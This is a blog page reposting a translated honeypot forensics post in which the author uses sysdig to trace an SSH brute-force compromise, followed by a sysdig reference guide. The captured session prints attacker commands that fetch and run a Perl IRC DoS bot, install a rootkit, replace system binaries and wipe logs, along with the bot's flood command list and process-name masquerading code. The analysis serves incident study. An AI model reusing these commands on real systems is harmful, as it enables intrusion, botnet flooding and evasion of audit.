<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>jfo planet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="jfo planet">
<meta property="og:url" content="http://blog.pickbox.me/index.html">
<meta property="og:site_name" content="jfo planet">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="jfo planet">
  
    <link rel="alternative" href="/atom.xml" title="jfo planet" type="application/atom+xml">
  
  
    <link rel="icon" href="//favicon.ico">
  
  <script src="/style.js"></script>
  

</head>

<body>
  <div id="container">
    <div class="left-col">
      <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img src="http://img.pickbox.me/wp-content/uploads/penguin.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">jfo</a></h1>
		</hgroup>

		
		<p class="header-subtitle">Hope is the best gift that tomorrow gives.</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">主页</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
	        
    		
    			
    			<a class="js-smart-menu" data-idx="0" href="javascript:void(0)">所有文章</a>
    			
    			
            
    			
    			<a class="js-smart-menu" data-idx="1" href="javascript:void(0)">分类</a>
    			
    			
            
    			
    			<a class="js-smart-menu" data-idx="2" href="javascript:void(0)">友链</a>
    			
    			
            
    			
    			<a class="js-smart-menu" data-idx="3" href="javascript:void(0)">关于我</a>
    			
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/jfojfo" title="github">github</a>
		        
					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/jfojfo" title="zhihu">zhihu</a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"><i class="icon-list"></i></div>
  		<h1 class="header-author js-mobile-header hide">jfo</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				
					<img src="http://img.pickbox.me/wp-content/uploads/penguin.gif" class="js-avatar">
				
			</div>
			<hgroup>
			  <h1 class="header-author">jfo</h1>
			</hgroup>
			
			<p class="header-subtitle">Hope is the best gift that tomorrow gives.</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/jfojfo" title="github">github</a>
			        
						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/jfojfo" title="zhihu">zhihu</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap">
        
  
    <article id="post-［转］搭建ngrok服务实现内网穿透" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/04/18/［转］搭建ngrok服务实现内网穿透/">［转］搭建ngrok服务实现内网穿透</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>转：<a href="https://imququ.com/post/self-hosted-ngrokd.html" target="_blank" rel="external">https://imququ.com/post/self-hosted-ngrokd.html</a></p>
<p><a href="http://img.pickbox.me/wp-content/uploads/搭建ngrok服务实现内网穿透.pdf" target="_blank" rel="external">搭建ngrok服务实现内网穿透</a></p>

      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2016/04/18/［转］搭建ngrok服务实现内网穿透/" class="archive-article-date">
  	<time datetime="2016-04-18T11:30:21.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-04-18</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Network/">Network</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-［转］Fishing-for-Hackers-Analysis-of-a-Linux-Server-Attack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/30/［转］Fishing-for-Hackers-Analysis-of-a-Linux-Server-Attack/">［转］Fishing for Hackers: Analysis of a Linux Server Attack</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><article><section>原文：<a href="http://drops.wooyun.org/tips/14148" target="_blank" rel="external">http://drops.wooyun.org/tips/14148</a></section></article></p>
<p>&nbsp;</p>
<p>几天前我偶然看到一篇经典的<a href="http://plusbryan.com/my-first-5-minutes-on-a-server-or-essential-security-for-linux-servers" target="_blank" rel="external">博文</a>，文章介绍了加强一个全新Linux服务安全性的常规做法，其中包括安装fail2ban，禁用SSH密码认证，随机化SSH端口，配置iptables等内容。这让我联想到，假如我与其背道而驰会发生什么？当然，最常见的结果就是使其沦陷成为一个僵尸网络的受害者，僵尸网络就是在不停地扫描大范围的公网IP地址，以期望通过暴力破解（SSH或Wordpress等）的方式找到一些配置不当的服务。但是当你成为这些简单攻击的受害者时，实际上发生了什么？攻击者又做了些什么？本篇文章就使用<a href="http://www.sysdig.org/" target="_blank" rel="external">sysdig</a>捕获分析我们服务器上实际攻击的例子，进而解答以上提出的问题。所以让我们钓起鱼儿来！</p>
<h1>0x00 起步</h1>

<hr>

<p>具体的想法就是将一组配置不当且存在漏洞的服务器暴露在互联网上，等到有人入侵后，我们再来分析一下发生了哪些有趣的事情。这就相当于：把诱饵撒到水中，等待鱼儿上钩，然后抓一个上来研究研究。首先我需要一些诱饵，意即一些配置不当的主机。现在来说这些都是so easy的事儿啦。我使用了好几种IaaS供应商（确切来说是AWS，Rackspace和Digital Ocean）的服务，配置了大约20台Ubuntu 12.04服务器——希望其中至少有一个服务器能够成为某些僵尸网络的“重点”关注对象。接下来就需要正确地记录操作系统的活动，这样我就可以确切地知道攻击者采取了哪些手段。因为我喜爱使用sysdig，所以我选择将sysdig和S3组合使用。我使用<code>-z</code>来启用sysdig的压缩功能，进而捕获每个I/O buffer中产生的大量字节数。</p>
<div><br><div id="highlighter_273270"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div></td><br><td><br><div><br><div><code>sysdig -s 4096 -z -w </code><code>/mnt/sysdig/</code><code>$(</code><code>hostname</code><code>).scap.gz</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>现在所有的实例都已配置妥当，我就简单地以”password”作为密码开启SSH root登录，以确保即使是最愚蠢的暴力破解算法也能很快地攻破系统。在这之后，我就静静地看着sysdig将结果dump到S3上。<br><h1>0x01 中头彩了！</h1><br><br><hr><br><br>第一个鱼儿来得如此之快：其中一个服务器仅在4小时后就被攻陷了！我是怎么知道的？我注意到在我的S3 bucket上，sysdig记录的文件在顷刻间往上跳了好几兆——远远超过了闲置服务器在后台运行时，应该产生大约100KB/hour的流量。所以我就将这个记录文件（大约150MB）下载到我的OSX上，探索研究一下。<br><h1>0x02 探索服务器端产生的攻击</h1><br><br><hr><br><br>我以我比较喜欢的方式开始进行分析：总览一下主机上进程，网络和I/O当中发生了些什么。首先，我通过受害主机上的网络I/O流量来查看top进程：<br><div><br><div id="highlighter_318427"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c topprocs_net</code></div><br><div><code>Bytes     Process</code></div><br><div><code>——————————</code></div><br><div><code>439.63M   </code><code>/usr/sbin/httpd</code></div><br><div><code>422.29M   </code><code>/usr/local/apac</code></div><br><div><code>5.27M     sshd</code></div><br><div><code>2.38M     wget</code></div><br><div><code>20.81KB   httpd</code></div><br><div><code>9.94KB    httpd</code></div><br><div><code>6.40KB    perl</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>服务器上产生了相当多的流量，但是我并没有配置任何服务！在那之后我也不记得有安装过<code>/usr/sbin/httpd</code>和<code>/usr/local/apac</code>。接下来我们再看看网络连接：<br><div><br><div id="highlighter_195185"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c topconns</code></div><br><div><code>Bytes     Proto     Connection</code></div><br><div><code>——————————</code></div><br><div><code>439.58M   udp       170.170.35.93:50978-&gt;39.115.244.150:800</code></div><br><div><code>422.24M   udp       170.170.35.93:55169-&gt;39.115.244.150:800</code></div><br><div><code>4.91M     tcp       85.60.66.5:59893-&gt;170.170.35.93:22</code></div><br><div><code>46.72KB   tcp       170.170.35.93:39193-&gt;162.243.147.173:3132</code></div><br><div><code>43.62KB   tcp       170.170.35.93:39194-&gt;162.243.147.173:3132</code></div><br><div><code>20.81KB   tcp       170.170.35.93:53136-&gt;198.148.91.146:6667</code></div><br><div><code>1000B     udp       170.170.35.93:0-&gt;39.115.244.150:800</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>我的主机产生了800MB的UDP流量——我的天哪！这简直就是活生生的DOS攻击。我猜测攻击者安装了一些僵尸网络的客户端，来生成相应的DOS流量，所以我当机立断地把服务器关了，确保它不会对其他人造成进一步的伤害。就我目前所掌握的信息可以确定服务器已经被攻陷了，我如果使用其他的监控工具也可以得出相同的结论。然而不同的是，我的S3 bucket里存储着全部的细节，所以我就可以开始深度挖掘实际发生的情况。我先使用我最爱的chisel，<code>spy_users</code>，看看恶意用户在登录之后干了些啥：<br><div><br><div id="highlighter_95936"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c spy_users</code></div><br><div><code>06:11:28 root) </code><code>cd</code> <code>/usr/sbin</code></div><br><div><code>06:11:30 root) </code><code>mkdir</code> <code>.shm</code></div><br><div><code>06:11:32 root) </code><code>cd</code> <code>/usr/sbin/</code><code>.shm</code></div><br><div><code>06:11:39 root) wget xxxxxxxxx.altervista.org</code><code>/l</code><code>.tgz</code></div><br><div><code>06:11:40 root) </code><code>tar</code> <code>zxvf l.tgz</code></div><br><div><code>06:11:42 root) </code><code>cd</code> <code>/usr/sbin/</code><code>.shm</code><code>/lib/</code><code>.muh</code><code>/src</code></div><br><div><code>06:11:43 root) </code><code>/bin/bash</code> <code>.</code><code>/configure</code> <code>–</code><code>enable</code><code>-</code><code>local</code></div><br><div><code>06:11:56 root) </code><code>make</code> <code>all</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>看到这里发生了什么吗？攻击者使用了一个“聪明”的名字<code>.shm</code>，在<code>/usr/sbin</code>目录下创建了一个隐藏文件夹，然后下载程序的源代码并开始编译。我把上面URL中的文件下载下来了，发现它是个IRC bouncer Muh。在存档文件中，我发现一些类似于攻击者非常个人化的配置文件这样有趣的事物，其中包含了各种用户名密码还有一堆用于自动加入Undernet的IRC channel。他接下来做了这些事：<br><div><br><div id="highlighter_707786"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div></td><br><td><br><div><br><div><code>06:13:19 root) wget http:</code><code>//xxxxxxxxx</code><code>.altervista.org/.sloboz.pdf</code></div><br><div><code>06:13:20 root) perl .sloboz.pdf</code></div><br><div><code>06:13:20 root) </code><code>rm</code> <code>-rf .sloboz.pdf</code></div><br><div><code>06:12:58 root) </code><code>/sbin/iptables</code> <code>-I INPUT -p tcp –dport 9000 -j ACCEPT</code></div><br><div><code>06:12:58 root) </code><code>/sbin/iptables</code> <code>-I OUTPUT -p tcp –dport 6667 -j ACCEPT</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>Nice！一个perl脚本文件被下载成为一个隐藏的pdf文件。我很好奇想要了解更多的东西。不幸的是，当我试图访问以上的URL时，文件已经不复存在了。好吧，还有sysdig可以帮助我，因为它记录了每一个I/O操作（正如我在命令中指定的，每个操作最多记录4096字节的数据）。我就可以看到wget往文件中写了些啥：<br><div><br><div id="highlighter_280507"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div><br><div>11</div><br><div>12</div><br><div>13</div><br><div>14</div><br><div>15</div><br><div>16</div><br><div>17</div><br><div>18</div><br><div>19</div><br><div>20</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -A -c echo_fds fd.filename=.sloboz.pdf</code></div><br><div><code>—— Write 3.89KB to </code><code>/run/shm/</code><code>.sloboz.pdf</code></div><br><div><code>#!/usr/bin/perl</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>##  Undernet Perl IrcBot v1.02012 bY DeBiL @RST Security Team   ## [ Help ] #########################################</code></div><br><div><code>##      Stealth MultiFunctional IrcBot Writen in Perl          #####################################################</code></div><br><div><code>##        Teste on every system with PERL instlled             ##  !u @system                                     ##</code></div><br><div><code>##                                                             ##  !u @version                                    ##</code></div><br><div><code>##     This is a free program used on your own risk.           ##  !u @channel                                    ##</code></div><br><div><code>##        Created for educational purpose only.                ##  !u @flood                                      ##</code></div><br><div><code>## I’m not responsible for the illegal use of this program.    ##  !u @utils                                      ##</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>## [ Channel ] #################### [ Flood ] ################################## [ Utils ] #########################</code></div><br><div><code>####################################################################################################################</code></div><br><div><code>## !u !join &lt;#channel&gt;          ## !u @udp1 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !su @conback &lt;ip&gt; &lt;port&gt;          ##</code></div><br><div><code>## !u !part &lt;#channel&gt;          ## !u @udp2 &lt;ip&gt; &lt;packet size&gt; &lt;time&gt;       ##  !u @downlod &lt;url+path&gt; &lt;file&gt;     ##</code></div><br><div><code>## !u !uejoin &lt;#channel&gt;        ## !u @udp3 &lt;ip&gt; &lt;port&gt; &lt;time&gt;              ##  !u @portscan &lt;ip&gt;                 ##</code></div><br><div><code>## !u !op &lt;channel&gt; &lt;nick&gt;      ## !u @tcp &lt;ip&gt; &lt;port&gt; &lt;packet size&gt; &lt;time&gt; ##  !u @mail &lt;subject&gt; &lt;sender&gt;       ##</code></div><br><div><code>## !u !deop &lt;channel&gt; &lt;nick&gt;    ## !u @http &lt;site&gt; &lt;time&gt;                   ##           &lt;recipient&gt; &lt;message&gt;    ##</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>因催斯汀…这原来是一个perl DoS客户端，可以被IRC控制执行命令，所以攻击者就可以很轻松地管理这些成千上万的机器。我也是足够地幸运，因为wget在整个过程中就进行了4KB的I/O操作，所以如果我查看全部的输出，我就可以得到完整的源代码（以上的是被截断的）。通过读取其中的header我们就可以知道这个东西是怎么运作的——它应该会接收到一个“<code>@udp</code>”IRC消息然后使用网络流量冲击目标主机。让我们来看看是否有人发送了一个命令：<br><div><br><div id="highlighter_651535"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -A -c echo_fds evt.buffer contains @udp</code></div><br><div><code>—— Read 67B from 170.170.35.93:39194-&gt;162.243.147.173:3132</code></div><br><div><code>:x!~xxxxxxxxx@xxxxxxxxx.la PRIVMSG </code><code>#nanana :!u @udp1 39.115.244.150 800 300</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>正如你所见，bot接收到一个（肯定来自它的owner）TCP连接，其中包含一条向39.115.244.150IP的800端口的攻击命令，这正好跟之前网络连接列表中，前两项泛洪数百兆流量的IP地址和端口号相同。这一切都很有意义！但是攻击并没有就此止步：<br><div><br><div id="highlighter_253838"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div></td><br><td><br><div><br><div><code>06:13:11 root) wget xxxxxxxxx.xp3.biz</code><code>/other/rk</code><code>.</code><code>tar</code></div><br><div><code>06:13:12 root) </code><code>tar</code> <code>xvf rk.</code><code>tar</code></div><br><div><code>06:13:12 root) </code><code>rm</code> <code>-rf rk.</code><code>tar</code></div><br><div><code>06:13:12 root) </code><code>cd</code> <code>/usr/sbin/rk</code></div><br><div><code>06:13:17 root) </code><code>tar</code> <code>zxf mafixlibs</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>什么是mafixlibs？Google说它是一种rootkit，但是我想看看在那个tar文件里包含着什么，所以我就再次使用sysdig，查询tar写了哪些文件：<br><div><br><div id="highlighter_733362"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div><br><div>11</div><br><div>12</div><br><div>13</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -c topfiles_bytes proc.name contains </code><code>tar</code> <code>and proc.args contains mafixlibs</code></div><br><div><code>Bytes     Filename</code></div><br><div><code>——————————</code></div><br><div><code>207.76KB  </code><code>/usr/sbin/rk/bin/</code><code>.sh</code><code>/sshd</code></div><br><div><code>91.29KB   </code><code>/usr/sbin/rk/bin/ttymon</code></div><br><div><code>80.69KB   </code><code>/usr/sbin/rk/bin/lsof</code></div><br><div><code>58.14KB   </code><code>/usr/sbin/rk/bin/find</code></div><br><div><code>38.77KB   </code><code>/usr/sbin/rk/bin/dir</code></div><br><div><code>38.77KB   </code><code>/usr/sbin/rk/bin/ls</code></div><br><div><code>33.05KB   </code><code>/usr/sbin/rk/bin/lib/libproc</code><code>.a</code></div><br><div><code>30.77KB   </code><code>/usr/sbin/rk/bin/ifconfig</code></div><br><div><code>30.71KB   </code><code>/usr/sbin/rk/bin/md5sum</code></div><br><div><code>25.88KB   </code><code>/usr/sbin/rk/bin/syslogd</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>可以很清楚地看到是一堆二进制文件。所以我猜测在我的<code>spy_users</code>输出中可以看到攻击者正在替换系统组件：<br><div><br><div id="highlighter_418315"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div></td><br><td><br><div><br><div><code>06:13:18 root) chattr -isa </code><code>/sbin/ifconfig</code></div><br><div><code>06:13:18 root) </code><code>cp</code> <code>/sbin/ifconfig</code> <code>/usr/lib/libsh/</code><code>.backup</code></div><br><div><code>06:13:18 root) </code><code>mv</code> <code>-f </code><code>ifconfig</code> <code>/sbin/ifconfig</code></div><br><div><code>06:13:18 root) chattr +isa </code><code>/sbin/ifconfig</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>确实，他人还挺好的给我留了一份备份文件。到目前为止我所掌握的信息有：我得到了一对IRC bots，一些入侵系统的二进制文件以及我成功解释了在开始时看到的UDP泛洪流量。但还遗留下来一个问题就是：为什么<code>topprocs_net</code>显示出所有的UDP流量都是由<code>/usr/sbin/httpd</code>和<code>/usr/local/apac</code>进程产生的，我还未在<code>spy_users</code>的输出中发现哪些安装在机器上的二进制文件呢？我猜测perl bot它自己能够发送UDP数据包，因为它是接收命令的那一方。让我们再次使用<code>sysdig</code>，并且定位到系统调用级别。我想查看所有和“<code>/usr/local/apac</code>”有关的事件：<br><div><br><div id="highlighter_230877"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz -A evt.args contains </code><code>/usr/local/apac</code></div><br><div><code>…</code></div><br><div><code>955716 06:13:20.225363385 0 perl (10200) &lt; clone res=10202(perl) exe=</code><code>/usr/local/apach</code> <code>args= tid=10200(perl) pid=10200(perl) ptid=7748(-</code><code>bash</code><code>) cwd=</code><code>/tmp</code> <code>fdlimit=1024 flags=0 uid=0 gid=0 exepath=</code><code>/usr/bin/perl</code></div><br><div><code>…</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>既然来到这儿了，我也想看看这个pid为10200的perl进程是何时启动的：<br><div><br><div id="highlighter_619673"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div></td><br><td><br><div><br><div><code>$ sysdig -r trace.scap.gz proc.pid = 10200</code></div><br><div><code>954458 06:13:20.111764417 0 perl (10200) &lt; execve res=0 exe=perl args=.sloboz.pdf. tid=10200(perl) pid=10200(perl) ptid=7748(-</code><code>bash</code><code>) cwd=</code><code>/run/shm</code> <code>fdlimit=1024 exepath=</code><code>/usr/bin/perl</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>同我们之前看到的那样，perl进程只是和“<code>.sloboz.pdf</code>”相关。但是你有没有看出其中的端倪？这极有可能被鱼目混珠过去：perl进程（肯定是DoS客户端）将它自己fork了（clone event 955716），但是在这之前它把它自己的可执行文件名和参数（“exe” and “args”）从“perl .sloboz.pdf” （event 954458）改为一个随机且不可疑的“/usr/local/apach” (event 955716)。这就可以迷惑像ps，top和sysdig这样的工具。当然，在这里是并没有<code>/usr/local/apach</code>的。你可以看到在fork进程后从未执行过一个新的二进制文件，它只是改变了名字而已。通过阅读perl客户端的源码（使用<code>echo_fds</code>），我可以进一步确认这一点：<br><div><br><div id="highlighter_522921"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div></td><br><td><br><div><br><div><code>my @rps = (</code><code>“/usr/local/apache/bin/httpd -DSSL”</code><code>,</code><code>“/usr/sbin/httpd -k start -DSSL”</code><code>,</code><code>“/usr/sbin/httpd”</code><code>,</code><code>“/usr/sbin/sshd -i”</code><code>,</code><code>“/usr/sbin/sshd”</code><code>,</code><code>“/usr/sbin/sshd -D”</code><code>,</code><code>“/sbin/syslogd”</code><code>,</code><code>“/sbin/klogd -c 1 -x -x”</code><code>,</code><code>“/usr/sbin/acpid”</code><code>,</code><code>“/usr/sbin/cron”</code><code>);    </code></div><br><div></div><br><div><code>my $process = $rps[rand scalar @rps];    </code></div><br><div></div><br><div><code>$0=</code><code>“$process”</code><code>.</code><code>“”</code><code>x16;;    </code></div><br><div></div><br><div><code>my $pid=fork;</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br>perl进程将其argv改为一个随机化的普通名字，然后再fork自身，很有可能是用来作为守护进程。最后，攻击者决定删除日志并用新的来替换它们：<br><div><br><div id="highlighter_394666"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div><br><div>2</div><br><div>3</div><br><div>4</div><br><div>5</div><br><div>6</div><br><div>7</div><br><div>8</div><br><div>9</div><br><div>10</div><br><div>11</div><br><div>12</div><br><div>13</div><br><div>14</div><br><div>15</div><br><div>16</div><br><div>17</div></td><br><td><br><div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/wtmp</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/lastlog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/secure</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/xferlog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/messages</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/run/utmp</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/run/utmp</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/messages</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/wtmp</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/messages</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/xferlog</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/secure</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/lastlog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/var/log/maillog</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/var/log/maillog</code></div><br><div><code>06:13:30 root) </code><code>rm</code> <code>-rf </code><code>/root/</code><code>.bash_history</code></div><br><div><code>06:13:30 root) </code><code>touch</code> <code>/root/</code><code>.bash_history</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br><h1>0x04 结论</h1><br><br><hr><br><br>哇噢。通过从高角度分析和在必要的时候深入到某个系统调用，我能够很准确地追踪到发生了什么。而这一切都是在实例完全关闭的情况下，仅仅使用<a href="http://www.sysdig.org/" target="_blank" rel="external">sysdig</a>来记录包含所有系统活动的文件！<br><h1>0x05 最后说明</h1><br><br><hr><br><br><ul><br>    <li>本篇博文中的所有IP地址都是经过随机化处理和隐藏的，因为其中的一些被攻击的服务器很可能仍然在使用，我不想暴露他们的任何信息。</li><br>    <li>因为如果I/O buffer被捕获的话记录文件很容易激增，所以在高负载的生产环境中进行持续性捕获是很困难的。设置一个好的捕获过滤器（例如过滤掉主Web服务器进程的事件）可以明显地缓解这一点。</li><br></ul><br><h1>0x06 译者注</h1><br><br><hr><br><br><h2><a href="https://github.com/draios/sysdig/wiki/How%20to%20Install%20Sysdig%20for%20Linux" target="_blank" rel="external">安装</a></h2><br>sysdig可直接在Kali2下安装：<br><div><br><div id="highlighter_743227"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td><br><div>1</div></td><br><td><br><div><br><div><code>apt-get -y </code><code>install</code> <code>sysdig</code></div><br></div></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2><a href="https://github.com/draios/sysdig/wiki/sysdig%20Quick%20Reference%20Guide#basic-command-list" target="_blank" rel="external">快速参考指南</a></h2><br><h3>命令格式</h3><br>sysdig [option]… [filter]<br><h3>命令选项</h3><br>-b, –print-base64<br><br>以base64的形式打印出数据buffer。这对二进制数据编码非常又用，进而可以将其用于处理文本数据的媒介中（例如，终端或者json）。<br><br>-c <em>chiselname chiselargs</em>, –chisel=<em>chiselname chiselargs</em><br><br>运行特定的chisel。如果某chisel需要传递参数，那么它们必须跟在chisel名之后。<br><br>-cl, –list-chisels<br><br>列出可用的chisel。其会在<code>.</code>,<code>./chisels</code>，<code>~/chisels</code>和<code>/usr/share/sysdig/chisels</code>中搜寻chisel。<br><br>-dv, –displayflt<br><br>为给定的过滤器设置输出。一旦设置了这个选项就会使事件在被状态系统解析后过滤。将事件在被分析前过滤是很有效的，但是可能会造成状态的丢失（例如FD名）。<br><br>-h, –help<br><br>打印出此帮助页面<br><br>-j, –json<br><br>以json的格式作为输出。数据buffer是否编码则取决于输出格式的选择。<br><br>-l, –list<br><br>列出可被过滤器和输出格式使用的字段。使用<code>-lv</code>将会得到每个字段的附加信息。<br><br>-L, –list-events<br><br>列出该设备支持的事件。<br><br>-n <em>num</em>, –numevents=<em>num</em><br><br>在一定事件后停止捕获<br><br>-p <em>output_format</em>, –print=<em>output_format</em><br><br>指定打印事件时使用的格式。可在examples部分获得更多相关信息。<br><br>-q, –quiet<br><br>不在屏幕上输出事件。这一点在dump到磁盘时非常有用。<br><br>-r <em>readfile</em>, –read=<em>readfile</em><br><br>从文件中读取事件。<br><br>-S, –summary<br><br>当捕获结束时打印出事件摘要（例如top事件列表）<br><br>-s <em>len</em>, –snaplen=<em>len</em><br><br>为每一个I/O buffer捕获的字节数。默认情况下，头80个字节会被捕获。请谨慎使用此选项，它可以产生巨大的记录文件。<br><br>-t <em>timetype</em>, –timetype=<em>timetype</em><br><br>更改事件时间的显示方式。可接收的值有：h用于人类可读的字符串，a用于绝对时间戳，r用于从开始捕获起的相对时间，d则用于事件登入登出中的delta。<br><br>-v, –verbose<br><br>详细输出。<br><br>-w <em>writefile</em>, –write=<em>writefile</em><br><br>将捕获的事件写入到<em>writefile</em>中。<br><h3>基本命令列表</h3><br>捕获当前的系统中的所有事件，并将其输出到屏幕上<br><blockquote>sysdig</blockquote><br>捕获当前的系统中的所有事件，并将其存储到磁盘中<br><blockquote>sysdig -qw dumpfile.scap</blockquote><br>从文件中读取事件，并将其输出到屏幕上<br><blockquote>sysdig -r dumpfile.scap</blockquote><br>打印出全部由cat引发的open操作系统调用<br><blockquote>sysdig proc.name=cat and evt.type=open</blockquote><br>打印出cat打开的文件名<br><blockquote>./sysdig -p”%evt.arg.name” proc.name=cat and evt.type=open</blockquote><br>列出可用的chisel<br><blockquote>./sysdig -cl</blockquote><br>为192.168.1.157IP地址运行spy_ip chisel<br><blockquote>sysdig –c spy_ip 192.168.1.157</blockquote><br><h3>输出格式</h3><br>在默认情况下，sysdig将在一行上打印出每个捕获事件的相关信息，以如下格式呈现：<br><br><code>&lt;evt.time&gt; &lt;evt.cpu&gt; &lt;proc.name&gt; &lt;thread.tid&gt; &lt;evt.dir&gt; &lt;evt.type&gt; 